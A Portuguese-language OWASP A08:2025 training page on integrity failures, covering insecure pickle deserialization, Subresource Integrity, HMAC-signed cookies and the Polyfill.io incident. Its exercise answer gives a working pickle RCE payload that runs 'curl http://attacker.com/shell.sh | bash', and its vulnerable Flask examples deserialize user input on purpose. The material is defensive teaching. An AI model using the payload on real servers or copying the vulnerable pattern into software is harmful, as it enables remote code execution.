---
title: "A08:2025 — Software or Data Integrity Failures"
description: "Falhas de integridade de software ou dados: quando você não pode confiar no que recebe"
tags: [integridade, desserialização, ci-cd, alto, a08]
---

# A08:2025 — Software or Data Integrity Failures

<span style="background-color: #e67e22; color: white; padding: 4px 12px; border-radius: 4px; font-weight: bold;">RISCO ALTO</span>

> **Analogia**: Você recebe uma encomenda lacrada, mas o lacre pode ser facilmente falsificado. O pacote parece íntegro, mas o conteúdo pode ter sido trocado durante o transporte. Sem verificação real de integridade, você não tem como saber.

---

## O que é?

=== "🟢 Para leigos"
    Integridade significa ter certeza de que algo não foi modificado sem autorização.
    Falhas de integridade acontecem quando um sistema confia em dados ou software
    **sem verificar se eles são genuínos**.

    Exemplo simples: um site que usa um plugin JavaScript de uma fonte externa.
    Se essa fonte for comprometida e o código do plugin for alterado, todos os visitantes
    do site executam código malicioso sem saber — porque o site nunca verificou se o
    código era o original.

=== "🟡 Desenvolvedor júnior"
    Integrity failures incluem:

    - **Desserialização insegura**: deserializar dados do usuário sem validação (pickle, Java deserialization)
    - **CDN sem SRI**: carregar scripts externos sem Subresource Integrity
    - **Auto-update inseguro**: aplicativo que baixa e executa atualizações sem verificar assinatura
    - **Pipeline sem verificação**: CI/CD que faz deploy sem validar integridade do artefato
    - **Cookies não assinados**: dados no cookie podem ser modificados pelo usuário

=== "🔴 Desenvolvedor sênior"
    Em 2025, Integrity Failures é o vetor mais sofisticado de supply chain attacks:

    - **Desserialização de objetos**: `pickle.loads()` em Python pode executar código arbitrário
    - **Java deserialization gadget chains**: exploração de classes existentes para RCE
    - **CI/CD pipeline injection**: GitHub Actions com segredos expostos, runners comprometidos
    - **Unsigned CDN content**: scripts sem SRI são vetores de XSS em larga escala
    - **Update mechanism attacks**: Sparkle/NSISUpdater sem verificação de certificado
    - **Typosquatting + auto-install**: scripts que instalam dependências automaticamente

---

## Código vulnerável vs. seguro

=== "❌ Desserialização Python insegura"
    ```python
    import pickle
    import base64
    from flask import Flask, request, session

    app = Flask(__name__)

    @app.route('/carregar-preferencias')
    def carregar_preferencias():
        # CRÍTICO: nunca deserializar dados não confiáveis com pickle!
        # Pickle pode executar código arbitrário durante a desserialização
        dados_cookie = request.cookies.get('preferencias')

        if dados_cookie:
            # Atacante pode criar um payload pickle que executa:
            # os.system('curl http://attacker.com/shell.sh | bash')
            preferencias = pickle.loads(base64.b64decode(dados_cookie))
            return f"Bem-vindo, {preferencias['nome']}"

        return "Cookie não encontrado"
    ```

=== "✅ Serialização segura com JSON + validação"
    ```python
    import json
    import hmac
    import hashlib
    from flask import Flask, request
    import os

    app = Flask(__name__)
    SECRET = os.environ['COOKIE_SECRET'].encode()

    def assinar_dados(dados: dict) -> str:
        """Serializa em JSON e assina com HMAC."""
        payload = json.dumps(dados, separators=(',', ':'))
        assinatura = hmac.new(SECRET, payload.encode(), hashlib.sha256).hexdigest()
        return f"{payload}.{assinatura}"

    def verificar_e_deserializar(dado_assinado: str) -> dict:
        """Verifica assinatura antes de deserializar."""
        partes = dado_assinado.rsplit('.', 1)
        if len(partes) != 2:
            raise ValueError("Formato inválido")

        payload, assinatura_recebida = partes

        # Verificação em tempo constante (previne timing attacks)
        assinatura_esperada = hmac.new(SECRET, payload.encode(), hashlib.sha256).hexdigest()
        if not hmac.compare_digest(assinatura_recebida, assinatura_esperada):
            raise ValueError("Assinatura inválida — dados podem ter sido modificados")

        dados = json.loads(payload)

        # Validar schema dos dados
        assert isinstance(dados.get('nome'), str)
        assert isinstance(dados.get('tema'), str)
        assert dados['tema'] in ['claro', 'escuro']

        return dados

    @app.route('/carregar-preferencias')
    def carregar_preferencias():
        dado_cookie = request.cookies.get('preferencias')
        if not dado_cookie:
            return "Cookie não encontrado"

        try:
            preferencias = verificar_e_deserializar(dado_cookie)
            return f"Bem-vindo, {preferencias['nome']}"
        except (ValueError, AssertionError, KeyError):
            return "Cookie inválido", 400
    ```

=== "✅ SRI para scripts externos"
    ```html
    <!-- SEM proteção de integridade — vulnerável se CDN for comprometido -->
    <script src="https://cdn.exemplo.com/jquery.min.js"></script>

    <!-- COM Subresource Integrity (SRI) -->
    <!-- O hash garante que o arquivo não foi modificado -->
    <!-- Se o arquivo mudar, o navegador recusa carregar -->
    <script
        src="https://cdn.jsdelivr.net/npm/jquery@3.7.1/dist/jquery.min.js"
        integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo="
        crossorigin="anonymous">
    </script>

    <!-- Gerar o hash SRI: -->
    <!-- openssl dgst -sha256 -binary jquery.min.js | openssl base64 -A -->
    <!-- Ou usar: https://www.srihash.org/ -->
    ```

---

## Cenário de ataque real

!!! danger "Cenário de ataque real — Ataque ao Polyfill.io (2024)"
    **Situação**: `polyfill.io` era um CDN popular usado por 100.000+ sites para
    carregar polyfills JavaScript. Em 2024, o domínio foi vendido para uma empresa chinesa.

    **Ataque**:

    1. Novo proprietário modifica o código JavaScript servido pelo CDN
    2. O código malicioso detecta o tipo de dispositivo do usuário
    3. Em dispositivos móveis específicos, redireciona para sites de golpe/scam
    4. Sites que carregavam `<script src="https://cdn.polyfill.io/v3/polyfill.min.js">` sem SRI
       começam a executar código malicioso nos navegadores dos visitantes

    **Consequência**: Mais de 380.000 sites afetados. Cloudflare e Google lançaram avisos
    urgentes. Sites que usavam SRI foram automaticamente protegidos — navegadores recusaram
    carregar o script modificado.

---

## Como prevenir

- [x] **JSON em vez de pickle/Java serialization**: para dados do usuário, sempre JSON
- [x] **SRI (Subresource Integrity)**: hash em todos os scripts e CSS externos
- [x] **Assinar artefatos de deploy**: verificar integridade antes de instalar/executar
- [ ] **Pipeline seguro**: CI/CD com aprovação manual para produção, audit logs
- [ ] **Imagens Docker assinadas**: Cosign para verificar autenticidade da imagem
- [ ] **Cookies assinados**: HMAC em dados de sessão armazenados no cliente
- [ ] **Whitelist de classes na desserialização**: se necessário deserializar objetos, limitar classes permitidas
- [ ] **Monitoramento de integridade de arquivos**: alertas quando arquivos críticos são modificados

---

## Exercícios práticos

!!! question "Exercício 1 — Identifique o risco"
    Você encontra este código em um sistema de e-commerce. Qual é o risco?

    ```python
    import pickle
    import base64
    from flask import request

    @app.route('/aplicar-desconto')
    def aplicar_desconto():
        cupom_data = request.args.get('cupom')
        cupom = pickle.loads(base64.b64decode(cupom_data))
        desconto = cupom.calcular_desconto()
        return f"Desconto: {desconto}%"
    ```

    ??? success "Ver resposta"
        **Risco crítico**: Desserialização arbitrária via pickle.

        Um atacante pode criar um payload pickle malicioso que, ao ser deserializado,
        executa código arbitrário no servidor (RCE — Remote Code Execution).

        Payload de exploit em Python:
        ```python
        import pickle, os, base64

        class Exploit(object):
            def __reduce__(self):
                # Este código será executado durante pickle.loads()
                return (os.system, ('curl http://attacker.com/shell.sh | bash',))

        payload = base64.b64encode(pickle.dumps(Exploit())).decode()
        # Enviar como: /aplicar-desconto?cupom=<payload>
        ```

        **Correção**: Nunca deserializar dados do usuário com pickle. Usar JSON com validação.

!!! question "Exercício 2 — Adicione SRI"
    Adicione proteção de integridade a este HTML:

    ```html
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    ```

    ??? success "Ver solução modelo"
        ```html
        <!-- Consulte https://www.bootstrapcdn.com/ para os hashes SRI oficiais -->
        <link
            href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"
            rel="stylesheet"
            integrity="sha384-9ndCyUaIbzAi2FUVXJi0CjmCapSmO7SnpJef0486qhLnuZ2cdeRhO02iuK6FUUVM"
            crossorigin="anonymous"
        >

        <script
            src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"
            integrity="sha384-geWF76RCwLtnZ8qwWowPQNguL3RmwHVBC9FhGdlKrxdiJJigb/j/68SIy3Te4Bkz"
            crossorigin="anonymous">
        </script>
        ```

        Para gerar hashes SRI de outros arquivos:
        ```bash
        curl -s https://cdn.exemplo.com/script.js | openssl dgst -sha384 -binary | openssl base64 -A
        ```

!!! tip "Desafio extra"
    - Configure o Dependabot para verificar integridade de GitHub Actions no seu repositório
    - Adicione um step de verificação de checksum SHA256 no seu pipeline de CI antes do deploy

---

## Quiz rápido

!!! example "Pergunta 1"
    Por que `pickle.loads()` é considerado uma vulnerabilidade crítica quando aplicado a dados do usuário?

    ??? note "Ver resposta"
        Pickle é um formato de serialização de objetos Python que pode representar **qualquer objeto Python**, incluindo objetos que executam código durante a desserialização (via `__reduce__`). Ao chamar `pickle.loads()` em dados controlados pelo atacante, você dá ao atacante a capacidade de executar código arbitrário no servidor — Remote Code Execution (RCE). Não há forma segura de usar pickle com dados não confiáveis.

!!! example "Pergunta 2"
    O que é **Subresource Integrity (SRI)** e como o navegador usa o hash?

    ??? note "Ver resposta"
        SRI é um mecanismo de segurança que permite ao navegador verificar que o recurso externo (script, CSS) não foi modificado. O desenvolvedor inclui um hash criptográfico (`integrity="sha384-..."`) no tag HTML. Quando o navegador baixa o arquivo, calcula o hash e compara com o declarado. Se não coincidir — seja porque o arquivo foi modificado no CDN ou porque houve ataque MITM —  o navegador recusa executar o recurso e registra um erro de segurança.

!!! example "Pergunta 3"
    Qual a diferença entre **integridade** e **confidencialidade** de dados?

    ??? note "Ver resposta"
        - **Confidencialidade**: apenas pessoas autorizadas podem **ler** os dados. Realizada por criptografia.
        - **Integridade**: garantia de que os dados não foram **modificados** sem autorização. Realizada por hashes/MACs/assinaturas digitais.

        Um dado pode ser confidencial mas não íntegro (criptografado mas modificado sem detecção), ou íntegro mas não confidencial (visível a todos, mas verificadamente não modificado). Para segurança completa, precisamos de ambos.

---

## Referências

!!! info "Saiba mais"
    - [OWASP A08:2025 — Software or Data Integrity Failures](https://owasp.org/Top10/2025/A08_2025-Software_Data_Integrity_Failures/)
    - [MDN — Subresource Integrity](https://developer.mozilla.org/pt-BR/docs/Web/Security/Subresource_Integrity)
    - [SRI Hash Generator](https://www.srihash.org/)
    - [Cosign — container signing](https://github.com/sigstore/cosign)
    - CVE-2019-20907 — tarfile path traversal
    - [Polyfill.io incident (2024)](https://sansec.io/research/polyfill-supply-chain-attack)
